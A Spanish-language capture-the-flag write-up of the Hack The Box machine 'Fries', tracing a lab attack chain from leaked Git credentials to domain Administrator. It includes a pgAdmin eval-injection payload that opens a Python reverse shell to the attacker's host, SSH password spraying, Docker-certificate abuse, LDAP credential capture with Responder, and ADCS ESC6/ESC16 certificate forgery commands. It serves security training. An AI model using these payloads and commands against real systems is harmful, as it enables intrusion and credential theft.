# Writeup: Fries (Hack The Box — Hard)

Fries es una máquina **Hard** que combina un entorno Linux con contenedores Docker y un dominio Active Directory Windows. El recorrido comienza con la enumeración de un sitio web que expone un repositorio Gitea con credenciales de base de datos, lo que permite acceder a un panel de administración de pgAdmin vulnerable a RCE (CVE‑2025‑2945) y obtener una shell en un contenedor. Desde allí se descubren credenciales que permiten el acceso SSH a la máquina host `web`, donde se abusan de un recurso NFS mal configurado y de certificados TLS de Docker para obtener acceso `root`. Finalmente, se extraen credenciales de un archivo de configuración de PWM, se captura una contraseña en texto plano mediante un ataque LDAP con Responder, y se explota una cadena de vulnerabilidades en Active Directory Certificate Services (ESC7 + ESC6 + ESC16) para obtener el hash del administrador del dominio y acceder como `Administrator`.

---

##
Se proporcionan credenciales iniciales para el usuario `d.cooper@fries.htb` con la contraseña `D4LE11maan!!`. 
---

## Fase 1: Reconocimiento

Realizamos un escaneo de puertos con Nmap para descubrir los servicios expuestos:

```bash
sudo nmap -sS -p- --min-rate 500 -n -Pn -vv 10.129.244.72 -oG allPorts
```

**Resultado:**

```
PORT      STATE SERVICE          REASON
22/tcp    open  ssh              syn-ack ttl 62
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 62
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
443/tcp   open  https            syn-ack ttl 62
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
2179/tcp  open  vmrdp            syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
[...]
```

Usamos `extractPorts` para extraer los puertos abiertos y luego realizamos un escaneo de servicios y versiones:

```bash
extractPorts allPorts
[*] Extrayendo información...
        [*] Dirección IP: 10.129.244.72
        [*] Puertos abiertos: 22,53,80,88,135,139,389,443,445,464,593,636,2179,3268,3269,5985,9389,49667,49673,49674,49678,49687,49911,62218,62245
```

```bash
nmap -sVC -p 22,53,80,88,135,139,389,443,445,464,593,636,2179,3268,3269,5985,9389,49667,49673,49674,49678,49687,49911,62218,62245 10.129.244.72 -oN targeted
```

**Resultados clave:**

```
22/tcp    open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          nginx 1.18.0 (Ubuntu)
|_http-title: Welcome to Fries - Fries Restaurant
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fries.htb)
443/tcp   open  ssl/http      nginx 1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=pwm.fries.htb/organizationName=Fries Foods LTD/stateOrProvinceName=Madrid/countryName=SP
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

**Observaciones clave:**

- **Dominio Active Directory**: `fries.htb` con controlador `DC01.fries.htb`.
- **Puertos Linux**: 22 (SSH), 80 (HTTP) y 443 (HTTPS) tienen un TTL de 62 (Linux), mientras que los puertos de AD tienen TTL 127 (Windows). Esto sugiere que los servicios Linux están en una máquina virtual o contenedor detrás del controlador de dominio.
- **Certificado SSL en el puerto 443**: El certificado tiene como `commonName=pwm.fries.htb`, pero el servicio está accesible directamente en `https://fries.htb` (sin necesidad de subdominio). Al acceder a esa URL, se carga la interfaz de **PWM (Password Web Manager)**, una aplicación de autoservicio de contraseñas para LDAP.
- **WinRM** habilitado en el puerto 5985.

Añadimos el dominio al archivo `/etc/hosts`:

```bash
echo "10.129.244.72 DC01.fries.htb fries.htb" >> /etc/hosts
```

---

## Fase 2: Enumeración Web y descubrimiento de subdominios

### 2.1 Sitio web principal (puerto 80)

El puerto 80 muestra un sitio web de un restaurante ("Fries Restaurant") con información estática. No hay funcionalidades interactivas. El código fuente no revela nada interesante. Wappalyzer indica que el servidor es nginx sobre Linux, pero el TTL del ping (`ttl=127`) sugiere que el sistema operativo real es Windows, lo que indica que el servidor web está en un contenedor o VM.

![Sitio web principal](./assets/fries-web.png)

### 2.2 PWM en el puerto 443

Accediendo a `https://fries.htb` cargamos la interfaz de **PWM (Password Web Manager)**, una aplicación de autoservicio de contraseñas para LDAP. Probamos las credenciales iniciales (`d.cooper / D4LE11maan!!`), pero no funcionan.

![PWM Login](./assets/pwm-login.png)

### 2.3 Fuzzing de subdominios

Realizamos un fuzzing para descubrir subdominios adicionales:

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.fries.htb" -u http://fries.htb -fs 154
```

**Resultado:** Encontramos el subdominio `code.fries.htb`.

```
code                    [Status: 200, Size: 13592, Words: 1048, Lines: 272, Duration: 203ms]
```

### 2.4 Gitea en `code.fries.htb`

Accediendo a `http://code.fries.htb` descubrimos un servicio **Gitea** (una plataforma de alojamiento de repositorios Git). Intentamos autenticarnos con las credenciales iniciales (`d.cooper / D4LE11maan!!`) y funcionan. Dentro de Gitea, encontramos un repositorio llamado `fries.htb`.

![Gitea Dashboard](./assets/gitea-dashboard.png)

El `README.md` del repositorio revela información valiosa:

- La aplicación web principal está escrita en **Flask (Python)** y utiliza **PostgreSQL** como base de datos.
- Se utiliza **Docker** y **Docker Compose** para el despliegue.
- Existe un subdominio para la gestión de la base de datos: `db-mgmt05.fries.htb`.
- La aplicación se ejecuta en un contenedor.

![Repositorio fries.htb](./assets/gitea-repo.png)

Clonamos el repositorio para examinarlo:

```bash
git clone http://code.fries.htb/dale/fries.htb.git
cd fries.htb
```

El historial de commits revela un archivo `.env` que fue eliminado pero que contenía credenciales de la base de datos:

```bash
git log
```

```bash
commit 47b29c411c3f2fac4fef6b2f896e6cd559dcf0ce (HEAD -> main, origin/main, origin/HEAD)
Author: Dale Cooper <d.cooper@fries.htb>
Date:   Sat May 31 10:16:09 2025 +0000

    Update README.md

commit d03e0d7b694b38f417e59afd536ff32c28780518
Author: Dale Cooper <d.cooper@fries.htb>
Date:   Wed May 28 17:03:38 2025 +0000

    Update README.md

commit 0e410b791f951dd99cd948149ea9feb665cfbcb2
Author: Dale Cooper <d.cooper@fries.htb>
Date:   Wed May 28 17:00:28 2025 +0000

    Added docs images

commit 2c5fc0fab831cd12bc189b05170f5769c78ad562
Author: Dale Cooper <d.cooper@fries.htb>
Date:   Wed May 28 16:39:12 2025 +0000

    Add docker-compose.yml

commit 6266ab41df06b9ccea7133d61058edf773886cb4
Author: Dale Cooper <dale@fries.htb>
Date:   Wed May 28 16:37:21 2025 +0000

    run.py updated

commit 45c2c6bb516f540d52b70af61ba5f3d066005d05
Author: Dale Cooper <d.cooper@fries.htb>
Date:   Wed May 28 14:13:19 2025 +0000

    Update README.md

commit ed330345bc3d69bb0bd9292c52b05585abcc5c6b
Author: dale <dale@fries.htb>
Date:   Wed May 28 10:59:56 2025 +0000

    Update README.md

commit 83eef4b82f7acf78a3a1a0c66f844fee1f1cb9de
Author: administrator <administrator@fries.htb>
Date:   Wed May 28 10:57:50 2025 +0000

    Update README.md

commit 3e8ca66c0de6388ac663d4c1ea56ad9d309fda3b
Author: Dale Cooper <dale@fries.htb>
Date:   Wed May 28 10:14:29 2025 +0000

    gitignore update

commit 03a8dc3b3c0bcca9eabcd850ea72d8b7c90b697f
Author: dale <dale@fries.htb>
Date:   Wed May 28 10:12:34 2025 +0000

    Add README.md

commit be59cceb54b56f00778822395bdf656216ab4b9f
Author: Dale Cooper <dale@fries.htb>
Date:   Wed May 28 09:30:36 2025 +0000

    Initial Commit
```

Observamos un commit que eliminó un archivo `.env`. Revisamos ese commit:

```bash
git show 3e8ca66c0de6388ac663d4c1ea56ad9d309fda3b
```

```diff
diff --git a/.env b/.env
deleted file mode 100644
index 3fd9e1c..0000000
--- a/.env
+++ /dev/null
@@ -1,2 +0,0 @@
-DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db
-SECRET_KEY=y0st528wn1idjk3b9a
```

Tenemos credenciales de PostgreSQL: `root:PsqLR00tpaSS11` y una clave secreta `y0st528wn1idjk3b9a`.

---

## Fase 3: Acceso a pgAdmin y RCE (CVE‑2025‑2945)

### 3.1 Descubrimiento de pgAdmin

El subdominio `db-mgmt05.fries.htb` nos lleva a la interfaz de **pgAdmin**, una herramienta de administración de PostgreSQL. Probamos las credenciales de PostgreSQL (`root:PsqLR00tpaSS11`) sin éxito. Sin embargo, al usar las credenciales iniciales (`d.cooper / D4LE11maan!!`), logramos acceder.



### 3.2 Identificación de la vulnerabilidad

Investigamos si pgAdmin es vulnerable. Encontramos **CVE‑2025‑2945**, una vulnerabilidad de ejecución remota de comandos (RCE) que afecta a pgAdmin 4 desde la versión 8.10 hasta la 9.1 inclusive. La vulnerabilidad se debe al uso inseguro de la función `eval()` en Python en los endpoints `/sqleditor/query_tool/download` y `/cloud/deploy`. Un atacante autenticado puede inyectar código Python arbitrario que será ejecutado en el servidor.

### 3.3 Explotación

Desde la interfaz de pgAdmin, nos conectamos a la base de datos `ps_db` (aunque no sea necesario) y abrimos la herramienta de consultas ("Query Tool"). Luego, usando Burp Suite o un proxy, capturamos la petición POST que se envía al endpoint `/sqleditor/query_tool/download` al intentar descargar los resultados de una consulta como CSV.

![Query Tool](./assets/pgadmin-query-tool.png)

Modificamos el parámetro `query_commited` para ejecutar un ping de prueba:

```json
{"filename":"data.csv","query_commited":"__import__('os').system('ping -c 4 10.10.17.44')"}
```

**Resultado:** Nuestro `tcpdump` captura los paquetes ICMP, confirmando la ejecución remota de comandos.

Luego, probamos la conectividad TCP enviando una petición de socket:

```json
{"query_commited": "__import__('socket').socket().connect(('10.10.17.44',443))"}
```

**Resultado:** Nuestro `netcat` recibe la conexión, confirmando que podemos establecer canales TCP salientes.

Finalmente, enviamos un payload para obtener una reverse shell utilizando Python:

```json
{"query_commited": "__import__('os').system(\"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\\\"10.10.17.44\\\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/bash\\\",\\\"-i\\\"])'\")"}
```

Obtenemos una shell en el contenedor de pgAdmin:

```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.17.44] from (UNKNOWN) [10.129.70.12] 49822
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
cb46692a4590:/pgadmin4$ id
uid=5050(pgadmin) gid=0(root) groups=0(root)
```

Somos el usuario `pgadmin` (UID 5050) con GID 0 (root) dentro del contenedor.

---

## Fase 4: Enumeración y Password Spraying

### 4.1 Variables de entorno

En el contenedor, listamos las variables de entorno:

```bash
env
PGADMIN_DEFAULT_EMAIL=admin@fries.htb
PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!!
```

Encontramos una contraseña: `Friesf00Ds2025!!`.

### 4.2 Password Spraying

Con esta nueva contraseña y las previamente encontradas (`y0st528wn1idjk3b9a`, `PsqLR00tpaSS11`), realizamos un ataque de fuerza bruta contra el servicio SSH que está abierto en el puerto 22. Creamos listas de usuarios (extraídos del repositorio y de los correos) y contraseñas.

**Usuarios (`users.txt`):**

```
d.cooper
svc
dales
mike
dylan
admin
administrator
```

**Contraseñas (`passwords.txt`):**

```
y0st528wn1idjk3b9a
PsqLR00tpaSS11
Friesf00Ds2025!!
```

```bash
nxc ssh fries.htb -u users.txt -p passwords.txt --continue-on-success
```

**Resultado:**

```
SSH         10.129.244.72   22     fries.htb        [+] svc:Friesf00Ds2025!!  Linux - Shell access!
```

Accedemos por SSH como `svc`:

```bash
ssh svc@fries.htb
```

---

## Fase 5: Enumeración del host `web`

### 5.1 Identificación del entorno

El comando `hostname -I` muestra varias interfaces:

```bash
svc@web:~$ hostname -I
192.168.100.2 172.18.0.1 172.17.0.1
```

La interfaz `eth0` tiene IP `192.168.100.2/24`, y su MAC comienza con `00:15:5d`, típica de las NICs virtuales de Hyper-V. Esto indica que la máquina es una VM de Hyper-V y que el controlador de dominio (DC01) es el host Hyper-V que NAT/port-forward los puertos 22, 80, 443 hacia esta VM. Además, las interfaces `docker0` y `br-0d1a963edc58` (172.18.0.1) confirman que esta VM es un host Docker que ejecuta los contenedores de la aplicación web, Gitea, pgAdmin, etc.

### 5.2 Recursos compartidos NFS

Enumeramos el sistema y encontramos un directorio `/srv/web.fries.htb` que es compartido por NFS:

```bash
svc@web:~$ showmount -e localhost
Export list for localhost:
/srv/web.fries.htb *
```

El archivo `/etc/exports` muestra que el recurso está montado con opciones `rw,no_subtree_check,insecure`. Esto permite a cualquier host montar el recurso y, debido a `no_subtree_check`, puede leer archivos fuera del directorio compartido si se utilizan enlaces simbólicos.

Además, existe un grupo llamado `infra managers` que tiene permisos sobre el directorio `certs` dentro de la raíz NFS. Obtenemos los miembros del grupo:

```bash
svc@web:~$ getent group "infra managers"
infra managers:*:59605603:m.hannigan,d.cooper,d.wilson
```

Consultamos el UID/GID de `d.wilson`:

```bash
svc@web:~$ id d.wilson
uid=59605601(d.wilson) gid=59600513(domain users) groups=59600513(domain users),59605603(infra managers)
```

### 5.3 Montaje del NFS desde Kali

Desde nuestra máquina Kali, creamos un usuario y grupo con los mismos IDs para acceder al recurso NFS:

```bash
sudo groupadd -g 59605603 infra
sudo useradd -u 59605601 -g 59605603 infra_user
```

Editamos `/etc/login.defs` para permitir UID superiores a 60000 y creamos el usuario.

Luego, usamos un túnel SSH para reenviar el puerto NFS (2049) a nuestro localhost:

```bash
ssh -L 2049:localhost:2049 svc@fries.htb
```

Montamos el recurso NFS en `/mnt`:

```bash
sudo mount -t nfs localhost:/srv/web.fries.htb /mnt
```

Ahora podemos acceder a los directorios compartidos. Cambiamos al usuario `infra_user` y accedemos a `certs`:

```bash
sudo su infra_user
cd /mnt/certs
ls
ca-key.pem  ca.pem  server-cert.pem  server.csr  server-key.pem  server-openssl.cnf
```

¡Tenemos los certificados TLS del demonio Docker! Esto incluye la clave privada de la CA (`ca-key.pem`), que nos permite firmar nuevos certificados de cliente para autenticarnos contra la API Docker.

---

## Fase 6: Escalada a root mediante Docker

### 6.1 Generación de certificado de cliente

Copiamos los archivos `ca.pem` y `ca-key.pem` al directorio `/mnt/shared`. Luego, generamos un nuevo certificado de cliente con `openssl`:

```bash
# Desde svc@web
cd /srv/web.fries.htb/shared
openssl genrsa -out key.pem 4096
openssl req -new -key key.pem -subj "/CN=root" -out client.csr
echo "extendedKeyUsage=clientAuth" > ext.cnf
openssl x509 -req -in client.csr -CA ca.pem -CAkey ca-key.pem -CAcreateserial -out cert.pem -days 365 -extfile ext.cnf
```

### 6.2 Acceso a la API Docker

Con el certificado de cliente, podemos interactuar con la API Docker en el puerto 2376 (TLS habilitado):

```bash
docker --tlsverify --tlscacert ca.pem --tlscert cert.pem --tlskey key.pem -H tcp://127.0.0.1:2376 ps
```

El comando funciona, confirmando que tenemos acceso administrativo a Docker.

### 6.3 Montaje del sistema de archivos raíz

Ejecutamos un contenedor con montaje del directorio raíz del host:

```bash
docker --tlsverify --tlscacert ca.pem --tlscert cert.pem --tlskey key.pem -H tcp://127.0.0.1:2376 run -it --rm -v /:/mnt fries-web bash
```

Dentro del contenedor, accedemos al sistema de archivos del host en `/mnt` y podemos leer cualquier archivo:

```bash
root@19ed8f002c4b:/app# cd /mnt/root
root@19ed8f002c4b:/mnt/root# ls -la
total 52
drwx------  9 root root 4096 Nov 19  2025 .
drwxr-xr-x 19 root root 4096 May 30  2025 ..
-rw-r--r--  1 root root   34 Aug  1 01:05 user.txt
drwx------  2 root root 4096 Nov 18  2025 .ssh
```

En la carpeta `/root/.ssh/` encontramos una clave privada `id_rsa` que nos permite conectarnos como `root` por SSH a la máquina `web`:

```bash
cat /mnt/root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
...
```

Copiamos la clave a nuestra máquina Kali y nos conectamos:

```bash
chmod 600 id_rsa
ssh -i id_rsa root@fries.htb
```

¡Obtenemos acceso como `root` en el host `web`!

---

## Fase 7: Escalada en el dominio Active Directory

### 7.1 Enumeración de archivos de configuración de PWM

Como `root` en `web`, exploramos el directorio `/scripts/pwm/config/` y encontramos el archivo `PwmConfiguration.xml`. Este contiene configuraciones de PWM, incluyendo un hash de contraseña de administrador y una contraseña LDAP cifrada.

Extraemos el hash Bcrypt:

```xml
<property key="configPasswordHash">$2y$04$W1TubX/9JAqpHlxx7xqXpesUMB2bJMV4dH/8pXbcul0NgA6ZexGyG</property>
```

Lo crackeamos con `hashcat` (modo 3200):

```bash
echo '$2y$04$W1TubX/9JAqpHlxx7xqXpesUMB2bJMV4dH/8pXbcul0NgA6ZexGyG' > hash.txt
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

**Resultado:** La contraseña es `rockon!`.

### 7.2 Password Spraying en AD

Probamos la contraseña `rockon!` contra la lista de usuarios del dominio, pero no funciona con ningún usuario. Sin embargo, en el archivo `PwmConfiguration.xml` también encontramos una contraseña cifrada para el usuario `CN=svc_infra,CN=Users,DC=fries,DC=htb`. Aunque está cifrada, más adelante encontraremos otra vía.

### 7.3 Captura de credenciales LDAP mediante PWM

Desde el panel de administración de PWM (accediendo a `https://fries.htb` con la contraseña descifrada `rockon!`), navegamos a **Configuration Editor**, pero no encontramos nada interesante. Vamos luego a **LDAP → LDAP Directories → default → Connection**. Observamos que el perfil LDAP apunta a `DC01.fries.htb`.

Agregamos una nueva entrada LDAP con la IP de nuestra máquina Kali (por ejemplo, `10.10.17.44`) y protocolo no cifrado (puerto 389).

![PWM LDAP Configuration](./assets/pwm-ldap-config2.png)

![PWM LDAP Configuration](./assets/pwm-ldap-config.png)

Luego, iniciamos **Responder** en nuestra Kali para capturar autenticaciones LDAP:

```bash
sudo responder -I tun0
```

En PWM, hacemos clic en **Test LDAP Profile** para probar la conexión. Responder captura una autenticación en texto claro:

```
[LDAP] Cleartext Client   : 10.129.76.120
[LDAP] Cleartext Username : CN=svc_infra,CN=Users,DC=fries,DC=htb
[LDAP] Cleartext Password : m6tneOMAh5p0wQ0d
```

Ahora tenemos credenciales válidas para el usuario `svc_infra`: `m6tneOMAh5p0wQ0d`.

### 7.4 Enumeración con BloodHound

Con las credenciales de `svc_infra`, realizamos una enumeración del dominio con BloodHound. Primero, usamos `rusthound-ce` (o `bloodhound-python`) para recolectar datos:

```bash
rusthound-ce -d fries.htb -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d' --zip
```

Esto genera un archivo ZIP con los datos. Lo importamos en BloodHound y analizamos el grafo.

![BloodHound - svc_infra](./assets/bloodhound-svc-infra.png)

Observamos que `svc_infra` tiene el permiso `ReadGMSAPassword` sobre la cuenta gestionada `GMSA_CA_PROD$`. También vemos que `GMSA_CA_PROD$` tiene permisos de `Enroll` y `ManageCA` sobre la CA (Certificate Authority) del dominio.

![BloodHound - GMSA_CA_PROD$](./assets/bloodhound-gmsa-ca-prod.png)

Obtenemos el hash NTLM de `GMSA_CA_PROD$` usando el módulo GMSA de `nxc`:

```bash
nxc ldap fries.htb -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d' --gmsa
```

```bash
LDAP        10.129.76.120   389    DC01             Account: gMSA_CA_prod$        NTLM: b0f2883453608fb7bffd1ac2e0e18188
```

### 7.5 Abuso de ADCS (ESC7, ESC6, ESC16)

`GMSA_CA_PROD$` tiene permisos `ManageCA` sobre la CA, lo que permite habilitar plantillas y modificar políticas de la CA, pero no `ManageCertificates` (denegado explícitamente). Sin embargo, podemos:

1. **Habilitar ESC6**: Modificar la política de la CA para permitir que los solicitantes especifiquen un Subject Alternative Name (SAN). Usamos `Certify.exe` en la máquina víctima. Primero, nos conectamos por WinRM con el hash de `gMSA_CA_prod$`:

```bash
evil-winrm-py -i fries.htb -u 'gMSA_CA_prod$' -H b0f2883453608fb7bffd1ac2e0e18188
```

Subimos `Certify.exe` (descargado de SharpCollection) y ejecutamos:

```powershell
upload Certify.exe
.\Certify.exe manage-ca --ca "DC01.fries.htb\fries-DC01-CA" --esc6
```

2. **Habilitar ESC16**: Deshabilitar la extensión de SID en los certificados para que el DC no la use en la autenticación.

```powershell
.\Certify.exe manage-ca --ca "DC01.fries.htb\fries-DC01-CA" --esc16
```

3. **Solicitar un certificado** para el usuario `Administrator` con el template `User` y especificando el UPN y SID de `Administrator`. Sin embargo, el certificado aún incluirá el SID del solicitante en la extensión de seguridad, por lo que falla. Pero con ESC16, la extensión se elimina, y el certificado solo contendrá el SID especificado en el SAN.

```bash
certipy-ad req -ca 'fries-DC01-CA' -template 'User' -upn 'administrator@fries.htb' -sid 'S-1-5-21-858338346-3861030516-3975240472-500' -u 'svc_infra@fries.htb' -p 'm6tneOMAh5p0wQ0d' -target DC01.fries.htb -dc-ip 10.129.244.72
```

Con el certificado obtenido, autenticamos con `certipy auth` y obtenemos el hash NTLM de `Administrator`:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.244.72
```

```bash
[*] Got hash for 'administrator@fries.htb': aad3b435b51404eeaad3b435b51404ee:a773cb05d79273299a684a23ede56748
```

### 7.6 Acceso como Administrador

Usamos `evil-winrm` para conectarnos al controlador de dominio como `Administrator`:

```bash
evil-winrm-py -i fries.htb -u administrator -H a773cb05d79273299a684a23ede56748
```

```powershell
evil-winrm-py PS C:\Users\Administrator> tree /f
C:\Users\Administrator
├───Desktop
│       root.txt
│       user.txt
```

Obtenemos ambas flags.

---

## 📌 Conclusión

Fries es una máquina **Hard** que combina:

1. **Reconocimiento** y descubrimiento de subdominios y repositorios Gitea.
2. **Credenciales expuestas** en el historial de Git y en variables de entorno de contenedores.
3. **Explotación de pgAdmin** (CVE‑2025‑2945) para obtener una shell en un contenedor.
4. **Password spraying** para obtener acceso SSH al host `web`.
5. **Abuso de NFS** y certificados TLS de Docker para escalar a `root` en el host `web`.
6. **Captura de credenciales LDAP** mediante PWM y Responder.
7. **Abuso de ADCS** (ESC7, ESC6, ESC16) para obtener el hash del Administrador del dominio.
8. **Acceso como Administrador** mediante WinRM.

---

## 📚 Lecciones aprendidas

1. **Los repositorios Git pueden contener información sensible en el historial**  
   Las credenciales de la base de datos estaban en un archivo `.env` que fue eliminado pero quedó en el historial. Nunca subir secretos a repositorios, incluso si se eliminan.

2. **pgAdmin es un vector crítico si no se actualiza**  
   La versión 9.1 era vulnerable a RCE (CVE‑2025‑2945). Mantener las herramientas de administración actualizadas es esencial.

3. **PWM puede ser usado para capturar credenciales LDAP**  
   Al agregar un perfil LDAP no cifrado y probar la conexión, el servidor envía la contraseña en texto claro. Esto subraya la importancia del cifrado en las comunicaciones LDAP.

4. **ADCS con permisos mal configurados es un vector de escalada crítico**  
   La combinación de `ManageCA`, ESC6 y ESC16 permitió obtener un certificado que autentica como Administrador. Las plantillas y políticas de la CA deben ser revisadas periódicamente.

